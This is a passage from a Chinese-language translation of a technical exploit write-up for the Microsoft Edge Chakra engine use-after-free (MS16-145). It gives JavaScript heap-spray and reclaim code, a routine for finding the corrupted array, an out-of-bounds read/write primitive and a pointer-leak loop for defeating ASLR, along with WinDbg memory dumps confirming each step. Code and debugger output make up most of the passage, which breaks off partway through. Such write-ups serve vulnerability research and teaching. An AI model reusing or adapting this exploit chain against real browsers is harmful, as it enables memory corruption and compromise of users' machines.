&nbsp;&nbsp;&nbsp;&nbsp;the_worker.terminate();
&nbsp;&nbsp;&nbsp;&nbsp;the_worker&nbsp;=&nbsp;null;
&nbsp;&nbsp;&nbsp;&nbsp;//Give&nbsp;some&nbsp;time&nbsp;for&nbsp;the&nbsp;raw&nbsp;buffer&nbsp;to&nbsp;be&nbsp;effectively&nbsp;freed
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;start&nbsp;=&nbsp;Date.now();
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(Date.now()&nbsp;-&nbsp;start&nbsp;&lt;&nbsp;2000){
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;//Refill&nbsp;the&nbsp;memory&nbsp;hole&nbsp;with&nbsp;a&nbsp;useful&nbsp;object&nbsp;(an&nbsp;int&nbsp;array)
&nbsp;&nbsp;&nbsp;&nbsp;reclaim();
&nbsp;&nbsp;&nbsp;&nbsp;//Returning&nbsp;1&nbsp;means&nbsp;that&nbsp;9&nbsp;&gt;&nbsp;0x55555555,&nbsp;so&nbsp;their&nbsp;positions&nbsp;must&nbsp;be&nbsp;swapped
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1;
}
[...]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们可以通过在JavascriptArrayBuffer :: FreeMemAlloc中设置断点来检查它是否按照我们预期的方式进行，其中VirtualFree即将被调用以释放ArrayBuffer的原始缓冲区：&nbsp;</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t011169861a82eb30a8.png" title="t010e9c243bda2115a9.png" alt="http://p7.qhimg.com/t010e9c243bda2115a9.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0:023&gt;&nbsp;bp&nbsp;chakra!Js::JavascriptArrayBuffer::FreeMemAlloc+0x1a&nbsp;&quot;r&nbsp;@$t0&nbsp;=&nbsp;@rcx&quot;
0:023&gt;&nbsp;g
chakra!Js::JavascriptArrayBuffer::FreeMemAlloc+0x1a:
00007fff`f8cc975a&nbsp;48ff253f8d1100&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[chakra!_imp_VirtualFree&nbsp;(00007fff`f8de24a0)]&nbsp;ds:00007fff`f8de24a0={KERNELBASE!VirtualFree&nbsp;(00007ff8`11433e50)}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">执行在断点处停止，所以现在我们可以检查ArrayBuffer的内容，该内容在排序后即将被释放：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0:024&gt;&nbsp;dds&nbsp;@rcx&nbsp;l21
00000235`48070000&nbsp;&nbsp;00000000
00000235`48070004&nbsp;&nbsp;00000000
00000235`48070008&nbsp;&nbsp;00000000
00000235`4807000c&nbsp;&nbsp;00000000
00000235`48070010&nbsp;&nbsp;00000000
00000235`48070014&nbsp;&nbsp;00000000
00000235`48070018&nbsp;&nbsp;00000000
00000235`4807001c&nbsp;&nbsp;00000000
00000235`48070020&nbsp;&nbsp;00000000
00000235`48070024&nbsp;&nbsp;00000000
00000235`48070028&nbsp;&nbsp;00000009&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;the&nbsp;dword&nbsp;at&nbsp;this&nbsp;position&nbsp;will&nbsp;be&nbsp;swapped...
00000235`4807002c&nbsp;&nbsp;00000000
00000235`48070030&nbsp;&nbsp;00000000
00000235`48070034&nbsp;&nbsp;00000000
00000235`48070038&nbsp;&nbsp;00000000
00000235`4807003c&nbsp;&nbsp;00000000
00000235`48070040&nbsp;&nbsp;00000000
00000235`48070044&nbsp;&nbsp;00000000
00000235`48070048&nbsp;&nbsp;00000000
00000235`4807004c&nbsp;&nbsp;55555555&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;...&nbsp;with&nbsp;the&nbsp;dword&nbsp;at&nbsp;this&nbsp;position
00000235`48070050&nbsp;&nbsp;00000000
00000235`48070054&nbsp;&nbsp;00000000
00000235`48070058&nbsp;&nbsp;00000000
00000235`4807005c&nbsp;&nbsp;00000000
00000235`48070060&nbsp;&nbsp;00000000
00000235`48070064&nbsp;&nbsp;00000000
00000235`48070068&nbsp;&nbsp;00000000
00000235`4807006c&nbsp;&nbsp;00000000
00000235`48070070&nbsp;&nbsp;00000000
00000235`48070074&nbsp;&nbsp;00000000
00000235`48070078&nbsp;&nbsp;00000000
00000235`4807007c&nbsp;&nbsp;00000000
00000235`48070080&nbsp;&nbsp;66666666</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">您可以看到偏移0x28处的值为0x9，偏移0x4c处的值为0x55555555。值0x66666666也可以在偏移0x80处看到；它是影响quicksort算法的地方，并获得我们需要的精确互换。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在我们可以在qsort_s函数上设置几个断点，将其设置在紧跟它所调用的TypedArrayCompareElementsHelper本机比较函数（最终调用我们的JS比较函数）的指令之后：&nbsp;</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t011185ec45b57318db.png" title="t0195974d259511f26d.png" alt="http://p0.qhimg.com/t0195974d259511f26d.png"/></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01ff6acc2f5af6dd16.png" title="t0104176ce5eb50576b.png" alt="http://p6.qhimg.com/t0104176ce5eb50576b.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0:010&gt;&nbsp;bp&nbsp;msvcrt!qsort_s+0x3c2
0:010&gt;&nbsp;bp&nbsp;msvcrt!qsort_s+0x194</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在我们恢复执行，几秒钟后，断点就被击中。如果一切顺利的话，ArrayBuffer应该被释放，并且其中一个喷射的整数数组的内存被回收：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0:024&gt;&nbsp;g
Breakpoint&nbsp;2&nbsp;hit
msvcrt!qsort_s+0x194:
00007ff8`138ffe84&nbsp;85c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;eax,eax
0:010&gt;&nbsp;dds&nbsp;00000235`48070000
00000235`48070000&nbsp;&nbsp;00000000
00000235`48070004&nbsp;&nbsp;00000000
00000235`48070008&nbsp;&nbsp;0000ffe0
00000235`4807000c&nbsp;&nbsp;00000000
00000235`48070010&nbsp;&nbsp;00000000
00000235`48070014&nbsp;&nbsp;00000000
00000235`48070018&nbsp;&nbsp;00009e75
00000235`4807001c&nbsp;&nbsp;00000000
00000235`48070020&nbsp;&nbsp;00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Js::SparseArraySegment&nbsp;object&nbsp;starts&nbsp;here
00000235`48070024&nbsp;&nbsp;00003ff2
00000235`48070028&nbsp;&nbsp;00003ff2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;reserved&nbsp;capacity&nbsp;of&nbsp;the&nbsp;integer&nbsp;array;&nbsp;it&nbsp;occupies&nbsp;the&nbsp;position&nbsp;of&nbsp;the&nbsp;0x9&nbsp;value&nbsp;that&nbsp;will&nbsp;be&nbsp;swapped
00000235`4807002c&nbsp;&nbsp;00000000
00000235`48070030&nbsp;&nbsp;00000000
00000235`48070034&nbsp;&nbsp;00000000
00000235`48070038&nbsp;&nbsp;41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;elements&nbsp;of&nbsp;the&nbsp;integer&nbsp;array&nbsp;start&nbsp;here
00000235`4807003c&nbsp;&nbsp;41414141
00000235`48070040&nbsp;&nbsp;41414141
00000235`48070044&nbsp;&nbsp;41414141
00000235`48070048&nbsp;&nbsp;41414141
00000235`4807004c&nbsp;&nbsp;7fffffff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;this&nbsp;one&nbsp;occupies&nbsp;the&nbsp;position&nbsp;of&nbsp;the&nbsp;0x55555555&nbsp;value&nbsp;which&nbsp;is&nbsp;going&nbsp;to&nbsp;be&nbsp;swapped
00000235`48070050&nbsp;&nbsp;41414141
00000235`48070054&nbsp;&nbsp;41414141</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">太棒了！我们的一个喷射的整数数组现在占据了以前由ArrayBuffer对象的原始缓冲区占据的内存。qsort_s的交换代码现在将以偏移量0x28（以前的UAF：值0x9，现在值为int数组的容量）处的dword与偏移量0x4c处的dword（之前的UAF：数组元素，值为0x55555555，现在：值为0x7fffffff的数组元素）进行交换 。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">交换发生在下面的循环中：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">qsort_s+1B0&nbsp;&nbsp;loc_11012FEA0:
qsort_s+1B0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movzx&nbsp;&nbsp;&nbsp;eax,&nbsp;byte&nbsp;ptr&nbsp;[rdx]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;grab&nbsp;a&nbsp;byte&nbsp;from&nbsp;the&nbsp;dword&nbsp;@&nbsp;offset&nbsp;0x4c
qsort_s+1B3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movzx&nbsp;&nbsp;&nbsp;ecx,&nbsp;byte&nbsp;ptr&nbsp;[r9+rdx]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;grab&nbsp;a&nbsp;byte&nbsp;from&nbsp;the&nbsp;dword&nbsp;@&nbsp;offset&nbsp;0x28
qsort_s+1B8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[r9+rdx],&nbsp;al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;swap
qsort_s+1BC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[rdx],&nbsp;cl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;swap
qsort_s+1BE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdx,&nbsp;[rdx+1]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;proceed&nbsp;with&nbsp;the&nbsp;next&nbsp;byte&nbsp;of&nbsp;the&nbsp;dwords
qsort_s+1C2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r8,&nbsp;1
qsort_s+1C6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jnz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;loc_11012FEA0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;loop</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">成功交换后，int数组看起来像下面这样，这表明我们已经用非常大的值（0x7fffffff）覆盖了原来的容量：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0:010&gt;&nbsp;dds&nbsp;00000235`48070000
00000235`48070000&nbsp;&nbsp;00000000
00000235`48070004&nbsp;&nbsp;00000000
00000235`48070008&nbsp;&nbsp;0000ffe0
00000235`4807000c&nbsp;&nbsp;00000000
00000235`48070010&nbsp;&nbsp;00000000
00000235`48070014&nbsp;&nbsp;00000000
00000235`48070018&nbsp;&nbsp;00009e75
00000235`4807001c&nbsp;&nbsp;00000000
00000235`48070020&nbsp;&nbsp;00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Js::SparseArraySegment&nbsp;object&nbsp;starts&nbsp;here
00000235`48070024&nbsp;&nbsp;00003ff2
00000235`48070028&nbsp;&nbsp;7fffffff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&lt;---&nbsp;we&#39;ve&nbsp;overwritten&nbsp;the&nbsp;array&nbsp;capacity&nbsp;with&nbsp;a&nbsp;big&nbsp;value!
00000235`4807002c&nbsp;&nbsp;00000000
00000235`48070030&nbsp;&nbsp;00000000
00000235`48070034&nbsp;&nbsp;00000000
00000235`48070038&nbsp;&nbsp;41414141
00000235`4807003c&nbsp;&nbsp;41414141
00000235`48070040&nbsp;&nbsp;41414141
00000235`48070044&nbsp;&nbsp;41414141
00000235`48070048&nbsp;&nbsp;41414141
00000235`4807004c&nbsp;&nbsp;00003ff2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;the&nbsp;old&nbsp;array&nbsp;capacity&nbsp;has&nbsp;been&nbsp;written&nbsp;here
00000235`48070050&nbsp;&nbsp;41414141
00000235`48070054&nbsp;&nbsp;41414141</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">获得相对内存读/写原语</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">由于我们已经用0x7fffffff覆盖了数组的原始容量，现在我们可以利用这个被破坏的int数组来读写其边界之外的内存。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">但是，我们的R / W原语有一些限制：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">由于数组容量为32位整数，我们将无法解析Edge进程的完整的64位地址空间；相反，我们最多能够寻址4 Gb的内存，起始地址从该int数组的基地址开始。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">此外，当目标地址被作为64位指针时，可以控制32位索引，我们只能访问大于我们破坏的int数组的基址的内存地址；不能访问较低的地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">最后，这是一个相对的内存R / W原语。我们不能指定要读写的绝对地址；而是需要从我们的破坏的int数组的基地址指定一个偏移量。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">寻找被破坏的整数数组</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">找到将为我们提供R / W原语的受损整数数组真的很容易。我们只需要遍历所有的喷射的int数组，寻找索引为5且值不是0x41414141的元素（请记住，在交换操作期间，原始数组容量将写入索引为5的元素所在的位置）即可。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">function&nbsp;find_corrupted_index(){
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(var&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;arr.length;&nbsp;i++){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(arr[i][5]&nbsp;!=&nbsp;0x41414141){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;i;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1;
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一旦我们找到了损坏的整数数组，我们就可以进行越界读写操作。在下面的代码片段中，我们使用受损数组读取其后面的内存中的值（这个数组应该是另一个int数组——别忘了，我们已经喷了数千个int数组，每个数组都正好占据了0x10000字节，而且它们是相邻并对齐到0x10000）。注意我们如何使用像0x4000这样的任意索引取得成功的，而真正的int数组容量是索引为0x3ff2的元素：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">var&nbsp;corrupted_index&nbsp;=&nbsp;find_corrupted_index();
if&nbsp;(corrupted_index&nbsp;!=&nbsp;-1){
&nbsp;&nbsp;&nbsp;&nbsp;arr[corrupted_index][0x4000]&nbsp;=&nbsp;0x21212121;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;OOB&nbsp;write
&nbsp;&nbsp;&nbsp;&nbsp;alert(&quot;OOB&nbsp;read:&nbsp;0x&quot;&nbsp;+&nbsp;arr[corrupted_index][0x3ff8].toString(16));&nbsp;&nbsp;//&nbsp;OOB&nbsp;read
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">此外，您应该始终记住，从任意索引N读取OOB需要先写入索引&gt; = N。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">泄漏指针</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在，我们已经取得了一个R / W原语，下面我们就要开始泄露几个指针，以便可以推断一些模块的地址并绕过ASLR。下面，我们通过在JS函数reclaim中将喷射的整数数组与一些字符串对象的数组交插来实现这一点：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">function&nbsp;reclaim(){
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;NUMBER_ARRAYS&nbsp;=&nbsp;10000;
&nbsp;&nbsp;&nbsp;&nbsp;arr&nbsp;=&nbsp;new&nbsp;Array(NUMBER_ARRAYS);
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;the_string&nbsp;=&nbsp;&quot;MS16-145&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(var&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;NUMBER_ARRAYS;&nbsp;i++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;((i&nbsp;%&nbsp;10)&nbsp;==&nbsp;9){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the_element&nbsp;=&nbsp;the_string;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Allocate&nbsp;an&nbsp;array&nbsp;of&nbsp;strings&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arr[i]&nbsp;=&nbsp;new&nbsp;Array((0x10000-0x38)/8);&nbsp;&nbsp;&nbsp;//sizeof(ptr)&nbsp;==&nbsp;8
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the_element&nbsp;=&nbsp;0x41414141;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Allocate&nbsp;an&nbsp;array&nbsp;of&nbsp;integers&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arr[i]&nbsp;=&nbsp;new&nbsp;Array((0x10000-0x38)/4);&nbsp;&nbsp;&nbsp;//sizeof(int)&nbsp;==&nbsp;4
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(var&nbsp;j&nbsp;=&nbsp;0;&nbsp;j&nbsp;&lt;&nbsp;arr[i].length;&nbsp;j++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arr[i][j]&nbsp;=&nbsp;the_element;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这样，在破坏其中一个数组的备用容量后，我们可以在数组边界之外每次读取0x10000字节，遍历相邻的数组，寻找最近的字符串对象数组：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">//Traverse&nbsp;the&nbsp;adjacent&nbsp;arrays,&nbsp;looking&nbsp;for&nbsp;the&nbsp;closest&nbsp;array&nbsp;of&nbsp;string&nbsp;objects
for&nbsp;(var&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;(arr.length&nbsp;-&nbsp;corrupted_index);&nbsp;i++){
&nbsp;&nbsp;&nbsp;&nbsp;base_index&nbsp;=&nbsp;0x4000&nbsp;*&nbsp;i;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//Index&nbsp;to&nbsp;make&nbsp;it&nbsp;point&nbsp;to&nbsp;the&nbsp;first&nbsp;element&nbsp;of&nbsp;another&nbsp;array
&nbsp;&nbsp;&nbsp;&nbsp;//Remember,&nbsp;you&nbsp;need&nbsp;to&nbsp;write&nbsp;at&nbsp;least&nbsp;to&nbsp;offset&nbsp;N&nbsp;if&nbsp;you&nbsp;want&nbsp;to&nbsp;read&nbsp;from&nbsp;offset&nbsp;N
&nbsp;&nbsp;&nbsp;&nbsp;arr[corrupted_index][base_index&nbsp;+&nbsp;0x20]&nbsp;=&nbsp;0x21212121;
&nbsp;&nbsp;&nbsp;&nbsp;//If&nbsp;it&#39;s&nbsp;an&nbsp;array&nbsp;of&nbsp;objects&nbsp;(as&nbsp;opposed&nbsp;to&nbsp;array&nbsp;of&nbsp;ints&nbsp;filled&nbsp;with&nbsp;0x41414141)
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(arr[corrupted_index][base_index]&nbsp;!=&nbsp;0x41414141){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert(&quot;found&nbsp;pointer:&nbsp;0x&quot;&nbsp;+&nbsp;ud(arr[corrupted_index][base_index+1]).toString(16)&nbsp;+&nbsp;ud(arr[corrupted_index][base_index]).toString(16));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里的ud()函数只是一个小帮手，能够以无符号双字的形式读取值：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">//Read&nbsp;as&nbsp;unsigned&nbsp;dword
function&nbsp;ud(sd)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;(sd&nbsp;&lt;&nbsp;0)&nbsp;?&nbsp;sd&nbsp;+&nbsp;0x100000000&nbsp;:&nbsp;sd;
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">从相对R / W到（几乎）绝对R / W与WebGL</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在完全任意的R / W原语的理想场景下，在将指针泄漏到某个对象之后，我们只需要在泄漏的地址上读取第一个qword，获得指向其vtable的指针，就能够计算模块的基址。但在这种情况下，我们有一个相对的R / W原语。由于R / W原语是通过在数组中使用索引来实现的，所以目标地址是这样计算的：target_addr = array_base_addr + index * sizeof（int）。我们完全控制了索引，但问题是我们不知道我们自己的数组基址是多少。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">那么数组基地址在哪里呢？它存储在一个JavascriptNativeIntArray对象的偏移量0x28处，它具有以下结构：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0000029c`73ea82c0&nbsp;&nbsp;00007ffc`259b38d8&nbsp;&nbsp;&nbsp;&nbsp;chakra!Js::JavascriptNativeIntArray::`vftable&#39;
0000029c`73ea82c8&nbsp;&nbsp;0000029b`725590c0&nbsp;&nbsp;&nbsp;&nbsp;//Pointer&nbsp;to&nbsp;type&nbsp;information
0000029c`73ea82d0&nbsp;&nbsp;00000000`00000000
0000029c`73ea82d8&nbsp;&nbsp;00000000`00010005
0000029c`73ea82e0&nbsp;&nbsp;00000000`00003ff2&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;array&nbsp;length
